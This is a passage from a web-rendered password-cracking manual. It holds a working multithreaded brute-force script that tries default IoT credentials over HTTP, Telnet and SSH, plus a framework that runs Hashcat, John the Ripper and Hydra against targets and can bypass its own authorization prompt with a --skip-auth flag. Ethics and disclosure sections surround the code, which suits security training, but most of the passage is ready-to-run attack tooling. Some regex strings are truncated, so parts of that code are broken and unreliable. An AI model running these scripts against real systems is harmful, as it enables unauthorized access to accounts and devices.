return True\r\n            return False\r\n        except:\r\n            return False\r\n    \r\n    def test_ssh_auth(self, username, password):\r\n        """Test SSH authentication"""\r\n        import paramiko\r\n        try:\r\n            ssh = paramiko.SSHClient()\r\n            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\r\n            ssh.connect(\r\n                self.target,\r\n                username=username,\r\n                password=password,\r\n                timeout=5\r\n            )\r\n            ssh.close()\r\n            return True\r\n        except:\r\n            return False\r\n    \r\n    def test_credentials(self, username, password):\r\n        """Test credentials based on service type"""\r\n        if self.service_type == \'http\':\r\n            return self.test_http_auth(username, password)\r\n        elif self.service_type == \'telnet\':\r\n            return self.test_telnet_auth(username, password)\r\n        elif self.service_type == \'ssh\':\r\n            return self.test_ssh_auth(username, password)\r\n        return False\r\n    \r\n    def worker(self):\r\n        """Worker thread"""\r\n        while not self.queue.empty():\r\n            try:\r\n                username, password = self.queue.get(timeout=1)\r\n                \r\n                if self.test_credentials(username, password):\r\n                    print(f"[SUCCESS] {username}:{password}")\r\n                    self.found_credentials.append((username, password))\r\n                else:\r\n                    print(f"[FAILED] {username}:{password}")\r\n                \r\n                time.sleep(0.5)  # Rate limiting for IoT devices\r\n                self.queue.task_done()\r\n            except:\r\n                break\r\n    \r\n    def start_attack(self):\r\n        """Start the attack"""\r\n        print(f"Starting {self.service_type} brute force against {self.target}")\r\n        \r\n        threads = []\r\n        for i in range(self.threads):\r\n            t = threading.Thread(target=self.worker)\r\n            t.daemon = True\r\n            t.start()\r\n            threads.append(t)\r\n        \r\n        self.queue.join()\r\n        print(f"Found {len(self.found_credentials)} valid credentials")\r\n\r\n# Common IoT default credentials\r\niot_defaults = [\r\n    (\'admin\', \'admin\'),\r\n    (\'admin\', \'password\'),\r\n    (\'admin\', \'\'),\r\n    (\'root\', \'admin\'),\r\n    (\'admin\', \'1234\'),\r\n    (\'user\', \'user\'),\r\n    (\'guest\', \'guest\'),\r\n    (\'admin\', \'pass\'),\r\n    (\'root\', \'root\'),\r\n    (\'admin\', \'admin123\')\r\n]\r\n\r\nif __name__ == "__main__":\r\n    import sys\r\n    if len(sys.argv) != 3:\r\n        print("Usage: python3 iot_bruteforce.py <target_ip> <service_type>")\r\n        print("Service types: http, telnet, ssh")\r\n        sys.exit(1)\r\n    \r\n    target, service = sys.argv[1:3]\r\n    bruteforcer = IoTBruteForcer(target, service, iot_defaults)\r\n    bruteforcer.start_attack()\r\nEOF\n'})}),"\n",(0,s.jsx)(e.h2,{id:"12-legal-and-ethical-considerations",children:"12. Legal and Ethical Considerations"}),"\n",(0,s.jsx)(e.admonition,{type:"note",children:(0,s.jsx)(e.p,{children:"All password cracking activities must be conducted within strict legal and ethical boundaries. Always obtain proper authorization and follow responsible disclosure practices."})}),"\n",(0,s.jsx)(e.h3,{id:"121-authorization-requirements",children:"12.1 Authorization Requirements"}),"\n",(0,s.jsx)(e.p,{children:"Password cracking techniques described in this manual must only be employed within the scope of:"}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"Authorized penetration testing engagements"})," with signed contracts and clear scope definitions"]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"Red team exercises"})," with explicit management approval and defined rules of engagement"]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"Security research"})," in controlled laboratory environments with owned equipment"]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"Educational purposes"})," using designated training platforms and lab environments"]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"Personal systems"})," where you have complete ownership and legal authority"]}),"\n"]}),"\n",(0,s.jsx)(e.h3,{id:"122-legal-framework-compliance",children:"12.2 Legal Framework Compliance"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-bash",children:"# Documentation template for authorized testing\r\ncat > engagement_documentation.md << 'EOF'\r\n# Password Security Assessment Documentation\r\n\r\n## Engagement Details\r\n- **Client**: [Organization Name]\r\n- **Engagement Type**: [Penetration Test/Red Team/Security Assessment]\r\n- **Authorization**: [Contract Number/SOW Reference]\r\n- **Scope**: [Defined IP ranges, systems, applications]\r\n- **Duration**: [Start Date - End Date]\r\n\r\n## Methodology\r\n- **Tools Used**: [List all tools and versions]\r\n- **Attack Vectors**: [Specific techniques employed]\r\n- **Targets**: [Systems and accounts tested]\r\n- **Limitations**: [Agreed restrictions and exclusions]\r\n\r\n## Results Summary\r\n- **Accounts Tested**: [Total number]\r\n- **Passwords Cracked**: [Number and percentage]\r\n- **Time to Crack**: [Average and maximum times]\r\n- **Common Patterns**: [Identified weaknesses]\r\n\r\n## Recommendations\r\n1. [Specific security improvements]\r\n2. [Policy recommendations]\r\n3. [Technical controls]\r\n4. [Training requirements]\r\n\r\n## Data Handling\r\n- **Password Storage**: [How cracked passwords are stored/destroyed]\r\n- **Evidence Retention**: [Timeline for data destruction]\r\n- **Access Controls**: [Who has access to results]\r\nEOF\r\n\r\n# Secure password storage for testing\r\ngpg --symmetric --cipher-algo AES256 cracked_passwords.txt\r\nshred -vfz -n 3 cracked_passwords.txt\n"})}),"\n",(0,s.jsx)(e.h3,{id:"123-responsible-disclosure",children:"12.3 Responsible Disclosure"}),"\n",(0,s.jsx)(e.p,{children:"When vulnerabilities are discovered during authorized testing:"}),"\n",(0,s.jsxs)(e.ol,{children:["\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"Immediate Notification"}),": Critical vulnerabilities should be reported within 24 hours"]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"Detailed Documentation"}),": Provide complete reproduction steps and impact analysis"]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"Remediation Support"}),": Offer guidance for fixing identified issues"]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"Coordinated Disclosure"}),": Follow agreed timelines for public disclosure"]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"Data Protection"}),": Ensure sensitive information is properly protected"]}),"\n"]}),"\n",(0,s.jsx)(e.h3,{id:"124-ethical-guidelines",children:"12.4 Ethical Guidelines"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-python",children:'```python\r\n# Ethical checklist for password security testing\r\nethical_checklist = {\r\n    "authorization": {\r\n        "written_permission": False,\r\n        "scope_defined": False,\r\n        "legal_review": False,\r\n        "management_approval": False\r\n    },\r\n    "conduct": {\r\n        "minimal_impact": False,\r\n        "data_protection": False,\r\n        "respect_privacy": False,\r\n        "avoid_disruption": False\r\n    },\r\n    "disclosure": {\r\n        "responsible_reporting": False,\r\n        "remediation_support": False,\r\n        "coordinated_timeline": False,\r\n        "data_destruction": False\r\n    }\r\n}\r\n\r\ndef verify_ethical_compliance(checklist):\r\n    """Verify ethical compliance before testing"""\r\n    for category, items in checklist.items():\r\n        print(f"\\n{category.upper()} REQUIREMENTS:")\r\n        for item, status in items.items():\r\n            status_text = "\u2713" if status else "\u2717"\r\n            print(f"  {status_text} {item.replace(\'_\', \' \').title()}")\r\n    \r\n    all_approved = all(\r\n        all(items.values()) \r\n        for items in checklist.values()\r\n    )\r\n    \r\n    if all_approved:\r\n        print("\\n\u2713 All ethical requirements met. Proceeding with testing.")\r\n    else:\r\n        print("\\n\u2717 Ethical requirements not met. Do not proceed with testing.")\r\n    \r\n    return all_approved\r\n\r\n# Example usage\r\nif __name__ == "__main__":\r\n    # Before starting any password testing\r\n    verify_ethical_compliance(ethical_checklist)\n'})}),"\n",(0,s.jsx)(e.h2,{id:"13-automation-and-scripting-framework",children:"13. Automation and Scripting Framework"}),"\n",(0,s.jsx)(e.admonition,{type:"note",children:(0,s.jsx)(e.p,{children:"Automation scripts should include proper error handling, logging, and rate limiting to avoid overwhelming target systems and to maintain detailed audit trails."})}),"\n",(0,s.jsx)(e.h3,{id:"131-comprehensive-password-testing-framework",children:"13.1 Comprehensive Password Testing Framework"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-python",children:"#!/usr/bin/env python3\r\n\"\"\"\r\nComprehensive Password Security Testing Framework\r\nAuthor: Security Research Team\r\nPurpose: Automated password security assessment with ethical controls\r\n\"\"\"\r\n\r\nimport argparse\r\nimport logging\r\nimport json\r\nimport time\r\nimport threading\r\nfrom datetime import datetime\r\nfrom pathlib import Path\r\nimport subprocess\r\nimport sys\r\nfrom queue import Queue\r\n\r\nclass PasswordTestingFramework:\r\n    def __init__(self, config_file=None):\r\n        self.config = self.load_config(config_file)\r\n        self.setup_logging()\r\n        self.results = {\r\n            'start_time': datetime.now().isoformat(),\r\n            'tools_used': [],\r\n            'targets_tested': [],\r\n            'credentials_found': [],\r\n            'statistics': {}\r\n        }\r\n    \r\n    def load_config(self, config_file):\r\n        \"\"\"Load configuration from JSON file\"\"\"\r\n        default_config = {\r\n            'output_dir': './results',\r\n            'rate_limit': 1.0,\r\n            'max_threads': 10,\r\n            'timeout': 30,\r\n            'wordlists': {\r\n                'usernames': './wordlists/usernames.txt',\r\n                'passwords': './wordlists/passwords.txt'\r\n            },\r\n            'tools': {\r\n                'hashcat': '/usr/bin/hashcat',\r\n                'john': '/usr/bin/john',\r\n                'hydra': '/usr/bin/hydra'\r\n            }\r\n        }\r\n        \r\n        if config_file and Path(config_file).exists():\r\n            with open(config_file, 'r') as f:\r\n                user_config = json.load(f)\r\n                default_config.update(user_config)\r\n        \r\n        return default_config\r\n    \r\n    def setup_logging(self):\r\n        \"\"\"Setup comprehensive logging\"\"\"\r\n        log_format = '%(asctime)s - %(levelname)s - %(message)s'\r\n        logging.basicConfig(\r\n            level=logging.INFO,\r\n            format=log_format,\r\n            handlers=[\r\n                logging.FileHandler(f\"{self.config['output_dir']}/framework.log\"),\r\n                logging.StreamHandler(sys.stdout)\r\n            ]\r\n        )\r\n        self.logger = logging.getLogger(__name__)\r\n    \r\n    def verify_authorization(self):\r\n        \"\"\"Verify testing authorization\"\"\"\r\n        print(\"AUTHORIZATION VERIFICATION\")\r\n        print(\"=\" * 50)\r\n        \r\n        questions = [\r\n            \"Do you have written authorization to test these systems? (yes/no): \",\r\n            \"Are you testing only systems you own or have explicit permission to test? (yes/no): \",\r\n            \"Have you reviewed the legal implications of this testing? (yes/no): \",\r\n            \"Do you understand the responsible disclosure requirements? (yes/no): \"\r\n        ]\r\n        \r\n        for question in questions:\r\n            response = input(question).lower().strip()\r\n            if response not in ['yes', 'y']:\r\n                print(\"TESTING ABORTED: Authorization requirements not met.\")\r\n                sys.exit(1)\r\n        \r\n        print(\"Authorization verified. Proceeding with testing...\")\r\n        self.logger.info(\"Authorization verified by user\")\r\n    \r\n    def load_wordlist(self, filepath):\r\n        \"\"\"Load wordlist from file\"\"\"\r\n        try:\r\n            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:\r\n                return [line.strip() for line in f if line.strip()]\r\n        except FileNotFoundError:\r\n            self.logger.error(f\"Wordlist not found: {filepath}\")\r\n            return []\r\n    \r\n    def run_hashcat(self, hash_file, wordlist, hash_type=0):\r\n        \"\"\"Run Hashcat with specified parameters\"\"\"\r\n        self.logger.info(f\"Starting Hashcat attack on {hash_file}\")\r\n        \r\n        cmd = [\r\n            self.config['tools']['hashcat'],\r\n            '-m', str(hash_type),\r\n            '-a', '0',\r\n            hash_file,\r\n            wordlist,\r\n            '--potfile-path', f\"{self.config['output_dir']}/hashcat.pot\",\r\n            '--outfile', f\"{self.config['output_dir']}/hashcat_cracked.txt\",\r\n            '--quiet'\r\n        ]\r\n        \r\n        try:\r\n            result = subprocess.run(\r\n                cmd,\r\n                timeout=self.config['timeout'] * 60,\r\n                capture_output=True,\r\n                text=True\r\n            )\r\n            \r\n            self.results['tools_used'].append('hashcat')\r\n            self.logger.info(f\"Hashcat completed with return code: {result.returncode}\")\r\n            \r\n            return result.returncode == 0\r\n            \r\n        except subprocess.TimeoutExpired:\r\n            self.logger.warning(\"Hashcat timed out\")\r\n            return False\r\n        except Exception as e:\r\n            self.logger.error(f\"Hashcat error: {str(e)}\")\r\n            return False\r\n    \r\n    def run_john(self, password_file, wordlist=None):\r\n        \"\"\"Run John the Ripper with specified parameters\"\"\"\r\n        self.logger.info(f\"Starting John the Ripper attack on {password_file}\")\r\n        \r\n        cmd = [self.config['tools']['john']]\r\n        \r\n        if wordlist:\r\n            cmd.extend(['--wordlist', wordlist])\r\n        \r\n        cmd.extend([\r\n            password_file,\r\n            '--pot', f\"{self.config['output_dir']}/john.pot\"\r\n        ])\r\n        \r\n        try:\r\n            result = subprocess.run(\r\n                cmd,\r\n                timeout=self.config['timeout'] * 60,\r\n                capture_output=True,\r\n                text=True\r\n            )\r\n            \r\n            self.results['tools_used'].append('john')\r\n            self.logger.info(f\"John completed with return code: {result.returncode}\")\r\n            \r\n            return result.returncode == 0\r\n            \r\n        except subprocess.TimeoutExpired:\r\n            self.logger.warning(\"John the Ripper timed out\")\r\n            return False\r\n        except Exception as e:\r\n            self.logger.error(f\"John error: {str(e)}\")\r\n            return False\r\n    \r\n    def run_hydra(self, target, service, userlist, passlist):\r\n        \"\"\"Run Hydra brute force attack\"\"\"\r\n        self.logger.info(f\"Starting Hydra attack against {target}:{service}\")\r\n        \r\n        cmd = [\r\n            self.config['tools']['hydra'],\r\n            '-L', userlist,\r\n            '-P', passlist,\r\n            '-t', str(self.config['max_threads']),\r\n            '-w', str(int(self.config['rate_limit'])),\r\n            '-o', f\"{self.config['output_dir']}/hydra_results.txt\",\r\n            target,\r\n            service\r\n        ]\r\n        \r\n        try:\r\n            result = subprocess.run(\r\n                cmd,\r\n                timeout=self.config['timeout'] * 60,\r\n                capture_output=True,\r\n                text=True\r\n            )\r\n            \r\n            self.results['tools_used'].append('hydra')\r\n            self.results['targets_tested'].append(f\"{target}:{service}\")\r\n            self.logger.info(f\"Hydra completed with return code: {result.returncode}\")\r\n            \r\n            return result.returncode == 0\r\n            \r\n        except subprocess.TimeoutExpired:\r\n            self.logger.warning(\"Hydra timed out\")\r\n            return False\r\n        except Exception as e:\r\n            self.logger.error(f\"Hydra error: {str(e)}\")\r\n            return False\r\n    \r\n    def analyze_results(self):\r\n        \"\"\"Analyze and compile results\"\"\"\r\n        self.logger.info(\"Analyzing results...\")\r\n        \r\n        # Parse cracked passwords from various tools\r\n        cracked_passwords = []\r\n        \r\n        # Hashcat results\r\n        hashcat_pot = Path(f\"{self.config['output_dir']}/hashcat.pot\")\r\n        if hashcat_pot.exists():\r\n            with open(hashcat_pot, 'r') as f:\r\n                for line in f:\r\n                    if ':' in line:\r\n                        hash_val, password = line.strip().split(':', 1)\r\n                        cracked_passwords.append({\r\n                            'tool': 'hashcat',\r\n                            'hash': hash_val,\r\n                            'password': password\r\n                        })\r\n        \r\n        # John results\r\n        john_pot = Path(f\"{self.config['output_dir']}/john.pot\")\r\n        if john_pot.exists():\r\n            with open(john_pot, 'r') as f:\r\n                for line in f:\r\n                    if ':' in line:\r\n                        parts = line.strip().split(':')\r\n                        if len(parts) >= 2:\r\n                            cracked_passwords.append({\r\n                                'tool': 'john',\r\n                                'username': parts[0],\r\n                                'password': parts[1]\r\n                            })\r\n        \r\n        # Hydra results\r\n        hydra_results = Path(f\"{self.config['output_dir']}/hydra_results.txt\")\r\n        if hydra_results.exists():\r\n            with open(hydra_results, 'r') as f:\r\n                for line in f:\r\n                    if 'login:' in line and 'password:' in line:\r\n                        # Parse Hydra output format\r\n                        parts = line.strip().split()\r\n                        for i, part in enumerate(parts):\r\n                            if part == 'login:' and i + 1 < len(parts):\r\n                                username = parts[i + 1]\r\n                            elif part == 'password:' and i + 1 < len(parts):\r\n                                password = parts[i + 1]\r\n                        \r\n                        cracked_passwords.append({\r\n                            'tool': 'hydra',\r\n                            'username': username,\r\n                            'password': password\r\n                        })\r\n        \r\n        self.results['credentials_found'] = cracked_passwords\r\n        self.results['statistics'] = {\r\n            'total_cracked': len(cracked_passwords),\r\n            'tools_used_count': len(set(self.results['tools_used'])),\r\n            'targets_tested_count': len(self.results['targets_tested'])\r\n        }\r\n        \r\n        # Password pattern analysis\r\n        if cracked_passwords:\r\n            passwords = [cred.get('password', '') for cred in cracked_passwords]\r\n            self.results['statistics']['password_analysis'] = self.analyze_password_patterns(passwords)\r\n    \r\n    def analyze_password_patterns(self, passwords):\r\n        \"\"\"Analyze common password patterns\"\"\"\r\n        analysis = {\r\n            'average_length': sum(len(p) for p in passwords) / len(passwords),\r\n            'length_distribution': {},\r\n            'character_usage': {\r\n                'uppercase': 0,\r\n                'lowercase': 0,\r\n                'digits': 0,\r\n                'special': 0\r\n            },\r\n            'common_patterns': {}\r\n        }\r\n        \r\n        # Length distribution\r\n        for password in passwords:\r\n            length = len(password)\r\n            analysis['length_distribution'][length] = analysis['length_distribution'].get(length, 0) + 1\r\n        \r\n        # Character usage\r\n        import re\r\n        for password in passwords:\r\n            if re.search(r'[A-Z]', password):\r\n                analysis['character_usage']['uppercase'] += 1\r\n            if re.search(r'[a-z]', password):\r\n                analysis['character_usage']['lowercase'] += 1\r\n            if re.search(r'\\d', password):\r\n                analysis['character_usage']['digits'] += 1\r\n            if re.search(r'[!@#$%^&*(),.?\":{}|<>]', password):\r\n                analysis['character_usage']['special'] += 1\r\n        \r\n        # Common patterns\r\n        patterns = {\r\n            'ends_with_digits': r'\\d+,\r\n            'starts_with_capital': r'^[A-Z]',\r\n            'contains_year': r'(19|20)\\d{2}',\r\n            'ends_with_exclamation': r'!+\r\n        }\r\n        \r\n        for pattern_name, pattern in patterns.items():\r\n            count = sum(1 for p in passwords if re.search(pattern, p))\r\n            analysis['common_patterns'][pattern_name] = count\r\n        \r\n        return analysis\r\n    \r\n    def generate_report(self):\r\n        \"\"\"Generate comprehensive report\"\"\"\r\n        self.results['end_time'] = datetime.now().isoformat()\r\n        \r\n        report_file = f\"{self.config['output_dir']}/assessment_report.json\"\r\n        with open(report_file, 'w') as f:\r\n            json.dump(self.results, f, indent=2)\r\n        \r\n        # Generate human-readable report\r\n        readable_report = f\"{self.config['output_dir']}/assessment_report.txt\"\r\n        with open(readable_report, 'w') as f:\r\n            f.write(\"PASSWORD SECURITY ASSESSMENT REPORT\\n\")\r\n            f.write(\"=\" * 50 + \"\\n\\n\")\r\n            \r\n            f.write(f\"Assessment Period: {self.results['start_time']} to {self.results['end_time']}\\n\")\r\n            f.write(f\"Tools Used: {', '.join(set(self.results['tools_used']))}\\n\")\r\n            f.write(f\"Targets Tested: {self.results['statistics']['targets_tested_count']}\\n\")\r\n            f.write(f\"Credentials Found: {self.results['statistics']['total_cracked']}\\n\\n\")\r\n            \r\n            if self.results['credentials_found']:\r\n                f.write(\"CRACKED CREDENTIALS:\\n\")\r\n                f.write(\"-\" * 30 + \"\\n\")\r\n                for cred in self.results['credentials_found']:\r\n                    if 'username' in cred:\r\n                        f.write(f\"User: {cred['username']} | Password: {cred['password']} | Tool: {cred['tool']}\\n\")\r\n                    else:\r\n                        f.write(f\"Hash: {cred.get('hash', 'N/A')} | Password: {cred['password']} | Tool: {cred['tool']}\\n\")\r\n                \r\n                f.write(\"\\nPASSWORD ANALYSIS:\\n\")\r\n                f.write(\"-\" * 30 + \"\\n\")\r\n                analysis = self.results['statistics'].get('password_analysis', {})\r\n                f.write(f\"Average Length: {analysis.get('average_length', 0):.2f}\\n\")\r\n                f.write(f\"Character Usage:\\n\")\r\n                for char_type, count in analysis.get('character_usage', {}).items():\r\n                    percentage = (count / len(self.results['credentials_found'])) * 100\r\n                    f.write(f\"  {char_type.title()}: {count} ({percentage:.1f}%)\\n\")\r\n        \r\n        self.logger.info(f\"Report generated: {readable_report}\")\r\n        print(f\"\\nAssessment complete. Report saved to: {readable_report}\")\r\n    \r\n    def cleanup(self):\r\n        \"\"\"Secure cleanup of sensitive data\"\"\"\r\n        self.logger.info(\"Starting secure cleanup...\")\r\n        \r\n        # Overwrite sensitive files\r\n        sensitive_files = [\r\n            f\"{self.config['output_dir']}/hashcat.pot\",\r\n            f\"{self.config['output_dir']}/john.pot\",\r\n            f\"{self.config['output_dir']}/hydra_results.txt\"\r\n        ]\r\n        \r\n        for file_path in sensitive_files:\r\n            if Path(file_path).exists():\r\n                # Simple overwrite (use shred for better security)\r\n                with open(file_path, 'w') as f:\r\n                    f.write('0' * 1024)\r\n                Path(file_path).unlink()\r\n        \r\n        self.logger.info(\"Cleanup completed\")\r\n\r\ndef main():\r\n    parser = argparse.ArgumentParser(description='Password Security Testing Framework')\r\n    parser.add_argument('--config', help='Configuration file path')\r\n    parser.add_argument('--hash-file', help='Hash file for offline cracking')\r\n    parser.add_argument('--target', help='Target for online attacks')\r\n    parser.add_argument('--service', help='Service type (ssh, http, etc.)')\r\n    parser.add_argument('--skip-auth', action='store_true', help='Skip authorization check (USE ONLY FOR OWNED SYSTEMS)')\r\n    \r\n    args = parser.parse_args()\r\n    \r\n    # Initialize framework\r\n    framework = PasswordTestingFramework(args.config)\r\n    \r\n    # Create output directory\r\n    Path(framework.config['output_dir']).mkdir(exist_ok=True)\r\n    \r\n    try:\r\n        # Verify authorization (critical step)\r\n        if not args.skip_auth:\r\n            framework.verify_authorization()\r\n        \r\n        # Load wordlists\r\n        usernames = framework.load_wordlist(framework.config['wordlists']['usernames'])\r\n        passwords = framework.load_wordlist(framework.config['wordlists']['passwords'])\r\n        \r\n        if not usernames or not passwords:\r\n            print(\"Error: Could not load required wordlists\")\r\n            sys.exit(1)\r\n        \r\n        # Offline attacks\r\n        if args.hash_file:\r\n            if Path(args.hash_file).exists():\r\n                framework.run_hashcat(args.hash_file, framework.config['wordlists']['passwords'])\r\n                framework.run_john(args.hash_file, framework.config['wordlists']['passwords'])\r\n            else:\r\n                print(f\"Hash file not found: {args.hash_file}\")\r\n        \r\n        # Online attacks\r\n        if args.target and args.service:\r\n            # Create temporary wordlist files\r\n            user_file = f\"{framework.config['output_dir']}/temp_users.txt\"\r\n            pass_file = f\"{framework.config['output_dir']}/temp_passwords.txt\"\r\n            \r\n            with open(user_file, 'w') as f:\r\n                f.write('\\n'.join(usernames))\r\n            \r\n            with open(pass_file, 'w') as f:\r\n                f.write('\\n'.join(passwords))\r\n            \r\n            framework.run_hydra(args.target, args.service, user_file, pass_file)\r\n            \r\n            # Cleanup temporary files\r\n            Path(user_file).unlink()\r\n            Path(pass_file).unlink()\r\n        \r\n        # Analyze results and generate report\r\n        framework.analyze_results()\r\n        framework.generate_report()\r\n        \r\n    except KeyboardInterrupt:\r\n        print(\"\\nTesting interrupted by user\")\r\n        framework.logger.info(\"Testing interrupted by user\")\r\n    except Exception as e:\r\n        print(f\"Error during testing: {str(e)}\")\r\n        framework.logger.error(f\"Error during testing: {str(e)}\")\r\n    finally:\r\n        # Always cleanup\r\n        framework.cleanup()\r\n\r\nif __name__ == \"__main__\":\r\n    main()\n"})}),"\n",(0,s.jsx)(e.h3,{id:"132-configuration-management",children:"13.2 Configuration Management"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-json",children:'{\r\n  "output_dir": "./results",\r\n  "rate_limit": 1.0,\r\n  "max_threads": 10,\r\n  "timeout": 30,\r\n  "wordlists": {\r\n    "usernames": "./wordlists/usernames.txt",\r\n    "passwords": "./wordlists/rockyou.txt",\r\n    "common_passwords": "./wordlists/common_passwords.txt"\r\n  },\r\n  "tools": {\r\n    "hashcat": "/usr/bin/hashcat",\r\n    "john": "/usr/bin/john",\r\n    "hydra": "/usr/bin/hydra",\r\n    "crackmapexec": "/usr/bin/crackmapexec"\r\n  },\r\n  "hash_types": {\r\n    "md5": 0,\r\n    "sha1": 100,\r\n    "sha256": 1400,\r\n    "ntlm": 1000,\r\n    "bcrypt": 3200\r\n  },\r\n  "services": [\r\n    "ssh",\r\n    "ftp",\r\n    "telnet",\r\n    "http-post-form",\r\n    "https-post-form",\r\n    "smb",\r\n    "rdp"\r\n  ],\r\n  "reporting": {\r\n    "include_cracked_passwords": true,\r\n    "include_statistics": true,\r\n    "include_recommendations": true,\r\n    "format": ["json", "txt", "html"]\r\n  }\r\n}\n'})}),"\n",(0,s.jsx)(e.h2,{id:"14-conclusion",children:"14. Conclusion"}),"\n",(0,s.jsx)(e.p,{children:"This comprehensive reference manual provides an exhaustive analysis of password cracking and brute force methodologies across multiple platforms, services, and attack vectors. The techniques described represent the current state-of-the-art in password security assessment, providing cybersecurity professionals with the knowledge necessary to both implement robust testing procedures and defend against sophisticated password attacks."}),"\n",(0,s.jsx)(e.p,{children:"The evolution of password cracking tools toward GPU acceleration, cloud computing integration, and AI-assisted pattern recognition demonstrates the ongoing arms race between offensive and defensive capabilities. Organizations must implement comprehensive password policies, multi-factor authentication, and continuous monitoring to maintain effective security posture."}),"\n",(0,s.jsx)(e.h3,{id:"141-key-takeaways",children:"14.1 Key Takeaways"}),"\n",(0,s.jsx)("ins",{children:(0,s.jsx)(e.strong,{children:"For Security Professionals:"})}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"Password cracking remains a critical component of security assessments"}),"\n",(0,s.jsx)(e.li,{children:"Modern tools provide unprecedented speed and capability through GPU acceleration"}),"\n",(0,s.jsx)(e.li,{children:"Automation frameworks enable comprehensive and repeatable testing methodologies"}),"\n",(0,s.jsx)(e.li,{children:"Proper authorization and ethical guidelines are essential for responsible testing"}),"\n"]}),"\n",(0,s.jsx)("ins",{children:(0,s.jsx)(e.strong,{children:"For Organizations:"})}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"Default credentials represent critical vulnerabilities across all device types"}),"\n",(0,s.jsx)(e.li,{children:"Password complexity alone is insufficient; implement multi-factor authentication"}),"\n",(0,s.jsx)(e.li,{children:"Regular password policy assessment and user training are essential"}),"\n",(0,s.jsx)(e.li,{children:"Monitoring and detection capabilities must evolve to address modern attack techniques"}),"\n"]}),"\n",(0,s.jsx)("ins",{children:(0,s.jsx)(e.strong,{children:"For Defenders:"})}),"\n",(0,s.jsxs)(e.ul,{children:["\n",(0,s.jsx)(e.li,{children:"Understanding attacker methodologies enables better defensive strategies"}),"\n",(0,s.jsx)(e.li,{children:"Rate limiting, account lockout, and behavioral analysis provide effective countermeasures"}),"\n",(0,s.jsx)(e.li,{children:"Honeypots and deception technologies can provide early warning of attacks"}),"\n",(0,s.jsx)(e.li,{children:"Continuous monitoring and log analysis are essential for attack detection"}),"\n"]}),"\n",(0,s.jsx)(e.h3,{id:"142-future-research-directions",children:"14.2 Future Research Directions"}),"\n",(0,s.jsx)("ins",{children:"Future research should focus on:"}),"\n",(0,s.jsxs)(e.ol,{children:["\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"Machine Learning Integration"}),": Development of AI-assisted password generation and pattern recognition"]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"Quantum Resistance"}),": Preparation for quantum computing impacts on cryptographic hash functions"]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"Cloud-Native Security"}),": Password security in containerized and serverless environments"]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"Biometric Integration"}),": Moving beyond traditional passwords to multi-modal authentication"]}),"\n",(0,s.jsxs)(e.li,{children:[(0,s.jsx)(e.strong,{children:"Behavioral Analytics"}),": Advanced detection of automated password attacks through user behavior analysis"]}),"\n"]}),"\n",(0,s.jsx)(e.h3,{id:"143-final-recommendations",children:"14.3 Final Recommendations"}),"\n",(0,s.jsx)(e.p,{children:"Security practitioners must balance the offensive capabilities described herein with robust defensive measures, comprehensive monitoring, and adherence to ethical guidelines. The responsible advancement of cybersecurity knowledge requires continuous collaboration between security researchers, practitioners, and organizations to develop effective defenses against evolving threats."}),"\n",(0,s.jsx)(e.p,{children:"Remember that the ultimate goal of password security assessment is not merely to demonstrate vulnerabilities, but to enable organizations to build more secure systems that protect sensitive data and maintain user trust in our increasingly connected world."}),"\n",(0,s.jsx)(e.h2,{id:"references",children:"References"}),"\n",(0,s.jsxs)(e.ol,{children:["\n",(0,s.jsx)(e.li,{children:(0,s.jsx)(e.a,{href:"https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html",children:"OWASP Authentication Cheat Sheet"})}),"\n",(0,s.jsx)(e.li,{children:(0,s.jsx)(e.a,{href:"https://pages.nist.gov/800-63-3/sp800-63b.html",children:"NIST SP 800-63B: Authentication and Lifecycle Management"})}),"\n",(0,s.jsx)(e.li,{children:(0,s.jsx)(e.a,{href:"https://hashcat.net/hashcat/",children:"Hashcat Documentation"})}),"\n",(0,s.jsx)(e.li,{children:(0,s.jsx)(e.a,{href:"https://www.openwall.com/john/doc/",children:"John the Ripper Documentation"})}),"\n",(0,s.jsx)(e.li,{children:(0,s.jsx)(e.a,{href:"https://github.com/vanhauser-thc/thc-hydra",children:"THC Hydra Documentation"})}),"\n",(0,s.jsx)(e.li,{children:(0,s.jsx)(e.a,{href:"https://github.com/byt3bl33d3r/CrackMapExec",children:"CrackMapExec Documentation"})}),"\n",(0,s.jsx)(e.li,{children:(0,s.jsx)(e.a,{href:"https://github.com/ropnop/kerbrute",children:"Kerbrute Documentation"})}),"\n",(0,s.jsx)(e.li,{children:(0,s.jsx)(e.a,{href:"https://book.hacktricks.wiki/en/generic-hacking/brute-force.html",children:"HackTricks Brute Force Guide"})}),"\n",(0,s.jsx)(e.li,{children:(0,s.jsx)(e.a,{href:"https://www.thehacker.recipes/ad/movement/credentials/cracking",children:"The Hacker Recipes - Credential 